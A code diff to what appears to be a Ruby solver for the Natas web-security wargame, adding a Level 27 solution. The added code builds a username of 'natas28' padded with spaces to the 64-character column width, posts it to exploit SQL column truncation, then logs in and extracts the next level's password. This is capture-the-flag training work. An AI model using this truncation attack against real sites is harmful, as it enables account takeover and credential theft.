@@ -746,4 +746,40 @@ end
 # Level 27
 class NatasLevel27 < NatasLevelBase
   LEVEL = 27
+  PAGE = '/'
+  COLUMN_SIZE = 64
+  NEXT_LOGIN = 'natas28'
+  PAYLOAD = format(
+    '%<login>s%<space>s%<tail>s',
+    login: NEXT_LOGIN,
+    space: ' ' * (COLUMN_SIZE - NEXT_LOGIN.length),
+    tail: 'x'
+  )
+
+  def exec
+    post(
+      PAGE,
+      {},
+      {
+        'username' => PAYLOAD,
+        'password' => ''
+      },
+    )
+    data = post(
+      PAGE,
+      {},
+      {
+        'username' => NEXT_LOGIN,
+        'password' => ''
+      },
+    ).body
+    match = /\[password\] =&gt; (\w{32})\n/.match(data)
+    not_found unless match
+    found(match[1])
+  end
+end
+
+# Level 28
+class NatasLevel28 < NatasLevelBase
+  LEVEL = 28
 end
